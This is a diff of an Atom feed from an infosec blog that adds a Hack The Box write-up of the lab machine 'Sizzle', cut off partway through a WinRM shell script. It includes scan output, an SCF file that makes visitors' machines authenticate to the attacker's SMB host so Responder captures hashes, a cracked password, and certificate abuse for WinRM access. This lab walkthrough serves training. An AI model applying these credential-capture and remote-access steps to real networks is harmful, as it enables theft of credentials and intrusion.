@@ -1,4 +1,667 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-05-26T02:16:23+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Chaos</title><link href="http://localhost:4000/hack-the-box/chaos/" rel="alternate" type="text/html" title="Hack The Box - Chaos" /><published>2019-05-25T00:00:00+02:00</published><updated>2019-05-25T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/chaos</id><content type="html" xml:base="http://localhost:4000/hack-the-box/chaos/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-06-01T15:21:09+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Sizzle</title><link href="http://localhost:4000/hack-the-box/sizzle/" rel="alternate" type="text/html" title="Hack The Box - Sizzle" /><published>2019-06-01T00:00:00+02:00</published><updated>2019-06-01T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/sizzle</id><content type="html" xml:base="http://localhost:4000/hack-the-box/sizzle/">&lt;hr /&gt;
+
+&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
+&lt;h4 id=&quot;hey-guys-today-sizzle-retired-and-heres-my-write-up-about-it-sizzle-was-a-great-machine-everything-about-it-was-great-it-was-very-realistic-fun-and-of-course-challenging-as-it-was-rated-insane-personally-one-of-my-favorites-and-one-of-the-best-active-directory-boxes-i-have-ever-solved-it-starts-by-getting-write-access-to-a-directory-in-an-smb-share-a-simple-scf-file-attack-with-responder-and-john-could-give-me-a-password-for-a-user-with-that-password-i-could-generate-a-certificate-request-and-get-a-certificate-then-a-winrm-session-after-that-comes-the-most-challenging-part-about-the-box-which-is-bypassing-antivirus-kerberoasting-and-privilege-escalation-but-before-doing-that-we-will-take-a-look-at-an-unintended-way-first-that-was-the-box-in-a-nutshell-its-a-windows-box-and-its-ip-is-101010103-i-added-it-to-etchosts-as-sizzlehtb-lets-jump-right-in-&quot;&gt;Hey guys today Sizzle retired and here’s my write-up about it. Sizzle was a great machine, everything about it was great. It was very realistic, fun and of course challenging as it was rated Insane. Personally one of my favorites and one of the best Active Directory boxes I have ever solved. It starts by getting write access to a directory in an &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; share, a simple &lt;code class=&quot;highlighter-rouge&quot;&gt;scf&lt;/code&gt; file attack with &lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; could give me a password for a user. With that password I could generate a certificate request and get a certificate then a &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; session. After that comes the most challenging part about the box which is bypassing antivirus, kerberoasting and privilege escalation but before doing that we will take a look at an unintended way first. That was the box in a nutshell, It’s a Windows box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.103&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;sizzle.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC sizzle.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/1.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;full-output-&quot;&gt;Full Output :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 31 19:41:35 2019 as: nmap -sV -sT -sC -o nmapinitial sizzle.htb
+Nmap scan report for sizzle.htb (10.10.10.103)
+Host is up (0.15s latency).
+Not shown: 987 filtered ports
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|_  SYST: Windows_NT
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html).
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2019-05-31T17:44:44+00:00; -6s from scanner time.
+443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time.
+| tls-alpn: 
+|   h2
+|_  http/1.1
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2019-05-31T17:44:43+00:00; -5s from scanner time.
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2019-05-31T17:44:42+00:00; -6s from scanner time.
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time.
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.70%I=7%D=5/31%Time=5CF1678A%P=i686-pc-linux-gnu%r(DNSVer
+SF:sionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x0
+SF:4bind\0\0\x10\0\x03&quot;);
+Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -5s, deviation: 0s, median: -6s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2019-05-31 19:44:44
+|_  start_date: 2019-05-31 12:06:07
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri May 31 19:45:27 2019 -- 1 IP address (1 host up) scanned in 232.62 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;we-got-a-lot-of-ports-we-got-ftp-on-port-21-dns-on-port-53-http-on-port-80-smb-and-ldap-we-also-see-that-the-domain-is-htblocal-and-commonname-is-sizzlehtblocal-so-i-added-it-to-etchosts-&quot;&gt;We got a lot of ports, we got &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; on port 21, &lt;code class=&quot;highlighter-rouge&quot;&gt;dns&lt;/code&gt; on port 53, &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80, &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap&lt;/code&gt;. We also see that the domain is &lt;code class=&quot;highlighter-rouge&quot;&gt;HTB.LOCAL&lt;/code&gt; and commonName is &lt;code class=&quot;highlighter-rouge&quot;&gt;sizzle.htb.local&lt;/code&gt;, so I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;anonymous-authentication-on-ftp-was-allowed-but-there-was-nothing-there-so-i-will-skip-that&quot;&gt;anonymous authentication on &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; was allowed but there was nothing there so I will skip that.&lt;/h4&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
+&lt;h4 id=&quot;i-checked-that-http-server-and-the-index-only-had-this-gif-&quot;&gt;I checked that &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; server and the index only had this &lt;code class=&quot;highlighter-rouge&quot;&gt;gif&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/4.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;so-i-ran-gobuster-&quot;&gt;So I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
+Gobuster v2.0.0              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://sizzle.htb/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/05/31 19:51:59 Starting gobuster
+=====================================================
+/aspnet_client (Status: 301)
+/certenroll (Status: 301)
+/Images (Status: 301)
+/images (Status: 301)
+/index.html (Status: 200)
+=====================================================
+2019/05/31 19:53:24 Finished
+=====================================================
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;certenroll-sounds-interesting-but-unfortunately-its-a-403-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/certenroll&lt;/code&gt; sounds interesting, but unfortunately it’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;403&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;its-time-to-check-smb-&quot;&gt;It’s time to check &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; .&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;smb-scf-file-attack-amandas-credentials&quot;&gt;SMB, SCF File Attack, amanda’s Credentials&lt;/h3&gt;
+&lt;h4 id=&quot;first-thing-we-need-to-know-is-the-shares-we-can-use-smbclient-to-list-the-shares-&quot;&gt;First thing we need to know is the shares, we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; to list the shares :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient --list //sizzle.htb/ -U &quot;&quot;&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-noticed-that-there-was-a-share-for-active-directory-certificate-services-most-likely-certsrv-will-be-on-the-web-server-&quot;&gt;I noticed that there was a share for Active Directory Certificate Services. Most likely &lt;code class=&quot;highlighter-rouge&quot;&gt;/certsrv&lt;/code&gt; will be on the web server :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://sizzle.htb/certsrv&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;yes-it-was-there-and-we-need-credentials-back-to-smb-the-only-share-i-could-access-anonymously-was-department-shares-&quot;&gt;Yes it was there, and we need credentials. Back to &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; the only share I could access anonymously was &lt;code class=&quot;highlighter-rouge&quot;&gt;Department Shares&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;it-had-a-lot-of-directories-i-could-write-to-2-of-them---zz_archive-and-userspublic&quot;&gt;It had a lot of directories, I could write to 2 of them :  &lt;code class=&quot;highlighter-rouge&quot;&gt;ZZ_ARCHIVE&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Users/Public&lt;/code&gt;.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-are-looking-for-credentials-since-we-can-write-to-one-of-the-directories-then-we-can-possibly-apply-an-scf-file-attack-you-can-read-about-it-here-we-are-going-to-put-an-scf-file-in-userspublic-it-looks-like-this-&quot;&gt;We are looking for credentials. Since we can write to one of the directories then we can possibly apply an &lt;code class=&quot;highlighter-rouge&quot;&gt;scf&lt;/code&gt; file attack. You can read about it &lt;a href=&quot;https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/&quot;&gt;here&lt;/a&gt;. We are going to put an &lt;code class=&quot;highlighter-rouge&quot;&gt;scf&lt;/code&gt; file in &lt;code class=&quot;highlighter-rouge&quot;&gt;Users/Public&lt;/code&gt;. It looks like this :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Shell]
+Command=2
+IconFile=\\10.10.xx.xx\share\rick.ico
+[Taskbar]
+Command=ToggleDesktop
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;then-we-will-run-responder-whenever-a-user-browses-that-directory-he-will-automatically-try-to-connect-to-my-box-through-smb-thats-when-responder-catches-the-hashes-more-info-in-the-link-above&quot;&gt;Then we will run &lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt;. Whenever a user browses that directory he will automatically try to connect to my box through &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;, that’s when &lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt; catches the hashes. More info in the link above.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/12.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;reponder -I tun0&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;responder-caught-hash-for-a-user-called-amanda-lets-crack-it-with-john-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt; caught hash for a user called &lt;code class=&quot;highlighter-rouge&quot;&gt;amanda&lt;/code&gt;. Let’s crack it with &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;the-password-is-ashare1972&quot;&gt;The password is &lt;code class=&quot;highlighter-rouge&quot;&gt;Ashare1972&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;requesting-a-certificate-winrm-session-as-amanda&quot;&gt;Requesting a Certificate, WinRm Session as amanda&lt;/h3&gt;
+&lt;h4 id=&quot;i-tried-to-access-certenroll-as-amanda-and-it-worked-fine-&quot;&gt;I tried to access &lt;code class=&quot;highlighter-rouge&quot;&gt;certenroll&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;amanda&lt;/code&gt; and it worked fine :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;so-i-went-to-certsrv--and-used-amandas-credentials-to-authenticate&quot;&gt;So I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/certsrv&lt;/code&gt;  and used &lt;code class=&quot;highlighter-rouge&quot;&gt;amanda&lt;/code&gt;’s credentials to authenticate&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/16.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;now-its-time-to-get-a-certificate-but-wait-a-second-whats-the-certificate-for-anyway-&quot;&gt;Now it’s time to get a certificate. But wait a second, what’s the certificate for anyway ?&lt;/h4&gt;
+&lt;h4 id=&quot;a-full-nmap-scan-shows-that-winrm-ports-are-open-&quot;&gt;A full &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan shows that &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; ports are open :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p- -T5 -vvv --max-retries 1 sizzle.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;full-output--1&quot;&gt;Full Output :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 31 20:22:10 2019 as: nmap -p- -T5 -vvv -o nmapfull --max-retries 1 sizzle.htb
+Warning: 10.10.10.103 giving up on port because retransmission cap hit (1).
+Nmap scan report for sizzle.htb (10.10.10.103)
+Host is up, received echo-reply ttl 127 (0.11s latency).
+Scanned at 2019-05-31 20:22:10 EET for 220s
+Not shown: 65506 filtered ports
+Reason: 65506 no-responses
+PORT      STATE SERVICE          REASON
+21/tcp    open  ftp              syn-ack ttl 127
+53/tcp    open  domain           syn-ack ttl 127
+80/tcp    open  http             syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+443/tcp   open  https            syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+5986/tcp  open  wsmans           syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+47001/tcp open  winrm            syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49665/tcp open  unknown          syn-ack ttl 127
+49667/tcp open  unknown          syn-ack ttl 127
+49669/tcp open  unknown          syn-ack ttl 127
+49679/tcp open  unknown          syn-ack ttl 127
+49682/tcp open  unknown          syn-ack ttl 127
+49683/tcp open  unknown          syn-ack ttl 127
+49686/tcp open  unknown          syn-ack ttl 127
+49689/tcp open  unknown          syn-ack ttl 127
+49701/tcp open  unknown          syn-ack ttl 127
+54195/tcp open  unknown          syn-ack ttl 127
+54204/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Fri May 31 20:25:50 2019 -- 1 IP address (1 host up) scanned in 220.02 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p 5985,5986 -sV -sT -sC sizzle.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;full-output--2&quot;&gt;Full Output :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 31 20:27:46 2019 as: nmap -p 5985,5986 -sV -sT -sC -o nmapwinrm sizzle.htb
+Nmap scan report for sizzle.htb (10.10.10.103)
+Host is up (0.11s latency).
+
+PORT     STATE SERVICE  VERSION
+5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+5986/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
+| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:sizzle.HTB.LOCAL
+| Not valid before: 2019-05-31T17:56:26
+|_Not valid after:  2020-05-30T17:56:26
+|_ssl-date: 2019-05-31T18:28:30+00:00; -6s from scanner time.
+| tls-alpn: 
+|   h2
+|_  http/1.1
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -6s, deviation: 0s, median: -6s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri May 31 20:28:43 2019 -- 1 IP address (1 host up) scanned in 57.38 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;port-5985-uses-http-while-5986-uses-https-when-i-got-amandas-credentials-i-tried-to-connect-to-port-5985-and-i-couldnt-so-we-will-do-it-through-port-5986-thats-why-we-need-a-certificate-if-you-dont-know-how-to-connect-through-winrm-well-get-to-that-later&quot;&gt;Port 5985 uses &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; while &lt;code class=&quot;highlighter-rouge&quot;&gt;5986&lt;/code&gt; uses &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt;. When I got &lt;code class=&quot;highlighter-rouge&quot;&gt;amanda&lt;/code&gt;’s credentials I tried to connect to port 5985 and I couldn’t, So we will do it through port 5986 that’s why we need a certificate. (If you don’t know how to connect through &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt;, we’ll get to that later.)&lt;/h4&gt;
+&lt;h4 id=&quot;we-will-generate-a-certificate-request-and-a-private-key-&quot;&gt;We will generate a certificate request and a private key :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;openssl req -newkey rsa:2048 -nodes -keyout request.key -out request.csr&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;then-we-will-submit-an-advanced-certificate-request-paste-our-request-and-download-the-certificate-base64-encoded&quot;&gt;Then we will submit an advanced certificate request, paste our request and download the certificate (base64 encoded)&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/21.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/22.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;now-we-can-use-winrm-but-whats-winrm-&quot;&gt;Now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt;, but what’s &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; ?&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Windows Remote Management (WinRM) is the Microsoft implementation of &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/winrm/ws-management-protocol&quot;&gt;WS-Management Protocol&lt;/a&gt;, a standard Simple Object Access Protocol (SOAP)-based, firewall-friendly protocol that allows hardware and operating systems, from different vendors, to interoperate.
+The WS-Management protocol specification provides a common way for systems to access and exchange management information across an IT infrastructure. WinRM and &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/winrm/windows-remote-management-glossary&quot;&gt;&lt;em&gt;Intelligent Platform Management Interface (IPMI)&lt;/em&gt;&lt;/a&gt;, along with the &lt;a href=&quot;https://go.microsoft.com/fwlink/p/?linkid=84396&quot;&gt;Event Collector&lt;/a&gt; are components of the &lt;a href=&quot;https://go.microsoft.com/fwlink/p/?linkid=45204&quot;&gt;Windows Hardware Management&lt;/a&gt; features. -&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/winrm/portal&quot;&gt;Microsoft&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;winrm-is-not-meant-to-be-used-from-linux-but-luckily-theres-a-ruby-library-for-it-thats-how-we-will-connect&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; is not meant to be used from Linux but luckily there’s a &lt;a href=&quot;https://github.com/WinRb/WinRM&quot;&gt;Ruby library&lt;/a&gt; for it. That’s how we will connect.&lt;/h4&gt;
+&lt;h4 id=&quot;i-used-alamots-shell-and-added-some-stuff-for-the-cert-and-the-key-&quot;&gt;I used &lt;a href=&quot;https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb&quot;&gt;Alamot’s shell&lt;/a&gt; and added some stuff for the cert and the key :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'winrm'&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Author: Alamot&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; 
+  &lt;span class=&quot;ss&quot;&gt;endpoint: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'https://10.10.10.103:5986/wsman'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;ss&quot;&gt;transport: :ssl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
